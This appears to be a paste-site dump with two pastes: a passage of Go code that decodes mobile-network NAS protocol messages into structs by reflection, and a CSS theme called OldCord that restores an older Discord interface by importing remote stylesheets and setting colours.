			vRes = append(vRes, byte(iei))
			vRes = append(vRes, la...)
			vRes = append(vRes, _ieV.Bytes()[:l]...)
		}
		if vRes != nil {
			res = append(res, vRes...)
		}
	}
	return
}

func unmarshalNasPdu(pdu []byte, t reflect.Type) (res TNasMsg, err error) {
	if t.Kind() != reflect.Struct {
		return nil, errors.New(""can unmarshal only to struct"")
	}
	sRes := reflect.New(t)
	sMsg := sRes.Elem()
	tMsg := sMsg.Type()
	var pPos, tFieldsStart int

mandatoryFields:
	for i := 0; i < sMsg.NumField(); i++ {
		ieT, ok := tMsg.Field(i).Tag.Lookup(""nas_ie_type"")
		if !ok { // skip untagged fields of message struct
			continue
		}
		var val reflect.Value
		switch ieT {
		case ""V"":
			ieL := tMsg.Field(i).Tag.Get(""nas_ie_length"")
			if ieL == ""1/2"" {
				a := uint8(0)
				val = reflect.ValueOf(&a).Elem()
				if tMsg.Field(i).Tag.Get(""nas_ie_position"") == ""LSB"" {
					val.SetUint(uint64(pdu[pPos] & 0xf))
				} else if tMsg.Field(i).Tag.Get(""nas_ie_position"") == ""MSB"" {
					val.SetUint(uint64(pdu[pPos] >> 4))
					pPos++
				} else {
					return nil, errors.New(fmt.Sprintf(""nas_ie_position must be LSB or MSB but %s found"",
						tMsg.Field(i).Tag.Get(""nas_ie_position"")))
				}
			} else if ieL == ""1"" {
				a := uint8(0)
				val = reflect.ValueOf(&a).Elem()
				if val.Kind() != reflect.Uint8 {
					return nil, errors.New(fmt.Sprintf(""field with nas_ie_type V and length 1/2 can ""+
						""have only byte/Uint8 kind, but %s found"", val.Kind()))
				}
				val.SetUint(uint64(pdu[pPos]))
				pPos++
			} else {
				l, err := strconv.Atoi(ieL)
				if err != nil {
					return nil, err
				}
				a := make([]byte, l)
				val = reflect.ValueOf(&a).Elem()
				if val.Kind() != reflect.Slice {
					return nil, errors.New(fmt.Sprintf(""field with nas_ie_type V and length more then 1 ""+
						""can be only slice, but %s found"", val.Kind()))
				}
				val.SetBytes(pdu[pPos : pPos+l])
				pPos += l
			}
		case ""LV"":
			l := int(pdu[pPos])
			pPos++
			a := make([]byte, l)
			val = reflect.ValueOf(&a).Elem()
			if val.Kind() != reflect.Slice {
				return nil, errors.New(fmt.Sprintf(""field with nas_ie_type LV ""+
					""can be only slice, but %s found"", val.Kind()))
			}
			val.SetBytes(pdu[pPos : pPos+l])
			pPos += l
		case ""LVE"":
			var l uint16
			_, err = binary.Decode(pdu[pPos:pPos+2], binary.BigEndian, &l)
			if err != nil {
				return nil, err
			}
			pPos += 2
			a := make([]byte, l)
			val = reflect.ValueOf(&a).Elem()
			if val.Kind() != reflect.Slice {
				return nil, errors.New(fmt.Sprintf(""field with nas_ie_type LVE ""+
					""can be only slice, but %s found"", val.Kind()))
			}
			val.SetBytes(pdu[pPos : pPos+int(l)])
			pPos += int(l)
		default:
			tFieldsStart = i
			break mandatoryFields
		}
		if sMsg.Field(i).Type().Implements(reflect.TypeOf((*TNasMsgIE)(nil)).Elem()) {
			sMsg.Field(i).MethodByName(""Set"").Call([]reflect.Value{val})
		} else if sMsg.Field(i).CanAddr() && sMsg.Field(i).Addr().Type().Implements(reflect.TypeOf((*TNasMsgIE)(nil)).Elem()) {
			sMsg.Field(i).Addr().MethodByName(""Set"").Call([]reflect.Value{val})
		} else {
			sMsg.Field(i).Set(val.Convert(sMsg.Field(i).Type()))
		}
	}

	for pPos < len(pdu) {
		var idx int
		idx, err = getFieldIdxByIEI(sMsg, pdu[pPos], tFieldsStart)
		if errors.Is(err, ENASUnknownIEI{}) {
			log.Print(err)
			err = nil
			if pdu[pPos]&0b10000000 == 0b10000000 {
				pPos++
				continue
			} else if pdu[pPos]&0b01111000 == 0b01111000 {
				var l uint16
				_, _ = binary.Decode(pdu[pPos+1:pPos+3], binary.BigEndian, &l)
				pPos += 3 + int(l)
				continue
			} else {
				l := pdu[pPos+1]
				pPos += 2 + int(l)
				continue
			}
		} else if err != nil {
			return nil, err
		}
		if sMsg.Field(idx).Type().Kind() != reflect.Pointer {
			return nil, errors.New(fmt.Sprintf(""field with nas_ie_type T... should be pointer but ""+
				""%s found"", sMsg.Field(idx).Type().Kind()))
		}
		var sVal []byte
		switch tMsg.Field(idx).Tag.Get(""nas_ie_type"") {
		case ""T"":
			val := reflect.New(sMsg.Field(idx).Elem().Type()).Elem()
			if val.Kind() != reflect.Bool {
				return nil, errors.New(fmt.Sprintf(""field with nas_ie_type T should be *bool, but *%s found"",
					val.Kind()))
			}
			val.SetBool(true)
			sMsg.Field(idx).Elem().Set(val)
			pPos++
			continue
		case ""TV"":
			if sMsg.Field(idx).Type().Elem().Kind() != reflect.Slice {
				return nil, errors.New(fmt.Sprintf(""field with nas_ie_type TV and length >1 should be ""+
					""*slice, but *%s found"", sMsg.Field(idx).Type().Elem().Kind()))
			}
			ieL := tMsg.Field(idx).Tag.Get(""nas_ie_length"")
			var l int
			l, err = strconv.Atoi(ieL)
			if err != nil {
				return nil, err
			}
			if l > 1 {
				sVal = pdu[pPos+1 : pPos+l]
			} else {
				sVal = pdu[pPos : pPos+1]
				sVal[0] &= 0x0f
			}
			pPos += l
		case ""TLV"":
			if sMsg.Field(idx).Type().Elem().Kind() != reflect.Slice {
				return nil, errors.New(fmt.Sprintf(""field with nas_ie_type TV and length >1 should be ""+
					""*slice, but *%s found"", sMsg.Field(idx).Type().Elem().Kind()))
			}
			l := int(pdu[pPos+1])
			sVal = pdu[pPos+2 : pPos+2+l]
			pPos += 2 + l
		case ""TLVE"":
			if sMsg.Field(idx).Type().Elem().Kind() != reflect.Slice {
				return nil, errors.New(fmt.Sprintf(""field with nas_ie_type TV and length >1 should be ""+
					""*slice, but *%s found"", sMsg.Field(idx).Type().Elem().Kind()))
			}
			var l uint16
			_, err = binary.Decode(pdu[pPos+1:pPos+3], binary.BigEndian, &l)
			if err != nil {
				return nil, err
			}
			sVal = pdu[pPos+3 : pPos+3+int(l)]
			pPos += 3 + int(l)
		}
		if tMsg.Field(idx).Type.Implements(reflect.TypeOf((*TNasMsgIE)(nil)).Elem()) {
			val := reflect.New(sMsg.Field(idx).Type().Elem())
			val.MethodByName(""Set"").Call([]reflect.Value{reflect.ValueOf(sVal)})
			sMsg.Field(idx).Set(val)
		} else {
			sMsg.Field(idx).Set(reflect.ValueOf(&sVal))
		}
	}
	pRes := reflect.ValueOf(&res)
	pRes.Elem().Set(sRes)
	return res, nil
}

func getFieldIdxByIEI(sMsg reflect.Value, iei byte, startIdx int) (res int, err error) {
	tMsg := sMsg.Type()
	for i := startIdx; i < sMsg.NumField(); i++ {
		tag := tMsg.Field(i).Tag.Get(""nas_iei"")
		if tag == """" {
			continue
		}
		var fIei int64
		fIei, err = strconv.ParseInt(tag, 0, 8)
		if err != nil {
			return
		}
		if byte(fIei) == iei || byte(fIei) == iei>>4 {
			return i, nil
		}
	}
	return res, NewENASUnknownIEI(iei)
}
"
r0R2BKb1,Untitled,Kirah,CSS,Monday 21st of April 2025 02:22:30 PM CDT,"/**
  * @name OldCord
  * @version 1.0
  * @author @milbit
  * @source https://github.com/milbits/oldcord
  * @description Restores discord's 2020 UI
*/

@import url(""https://milbits.github.io/oldcord/src/components/vars.css"");
@import url(""https://milbits.github.io/oldcord/src/components/color.css"");
@import url(""https://milbits.github.io/oldcord/src/components/imgs.css"");
@import url(""https://milbits.github.io/oldcord/src/components/other.css"");
/* @import url(""https://milbits.github.io/oldcord/src/components/profile.css""); */
@import url(""https://milbits.github.io/oldcord/src/components/redesign.css"");


/*
Addons
remove a ""/*"" below to enable one
*/

/*@import url(""https://milbits.github.io/oldcord/src/components/oldEmojis.css"");*/
/*@import url(""https://milbits.github.io/oldcord/src/components/oldContext.css"");*/
/* @import url(""https://milbits.github.io/oldcord/src/components/showEffects.css""); */

/* Options */

:root {
	/* Re-adds the animation for reactions. Might look weird | 0 - off | 1 - on*/
	--reaction-animation: 1;
	--channels-default: #90969d !important;
}


/* ================================ profile.css ======================== */


/* ================================ showEffects.css ======================== */





/* ================================ custom ======================== */


[class^=""upperContainer__""] [class^=""children__""] {
    flex-wrap: nowrap;
    justify-content: flex-start;
    width: 0px;
}

[class^=""children__""] [class^=""topic__""] {
    text-overflow: ellipsis;
    overflow: hidden;
    max-width: 70%;
}

/* список каналов */
[class^=""sidebarList_""], [class^=""sidebarList_""] > [class^=""container""] {
	background-color: #303135 ;
}

[class^=""containerDefault""] [class^=""link""]{
	color: #8b8e94
}

[class*=""selected""] > [class*=""selectedChannel""] > div > a {
	background-color: #424449;
}

/* чат */
[class*=""chatContent""] > div, [class*=""chatContent""] > form  {
	background-color: #34363a;
}



[id^=""popout""] [class*=""container""], [id^=""popout""] [class*=""outer""]{
	margin: 0px;
	padding: 0px;
	padding-top: 0px !important;
	padding-bottom: 0px;
}

[id^=""popout""] [class*=""outer""]{
	background-color: #303135;
}

/*
[id^=""popout""] [class*=""header""] > [class*=""avatar""] {
	position: relative;
	left: 85px;
	padding-top: 30px;
}
*/

/*
[class*=""experimentWrapper""] [class*=""buttonSection""] [class*=""attachedCaretButtonContainer""] div:nth-child(3) {
	display: none;
}
*/

[class*=""experimentWrapper""] > div:nth-child(2) > div:nth-child(3) {
	left: 0px;
	position: absolute;
}

[id^=""popout""] [class*=""picker""] {
	background-color: #333438;
}

[id^=""chat-messages""]:hover {
	background-color: #3d3f45;
}

[class^=""mention""], [class^=""botTag""], [class^=""markup""] [class^=""wrapper""], [class^=""channelMention""] {
	color: #EEE;
	background-color: rgba(100,100,250,0.5);
	border-radius: 5px;
}"
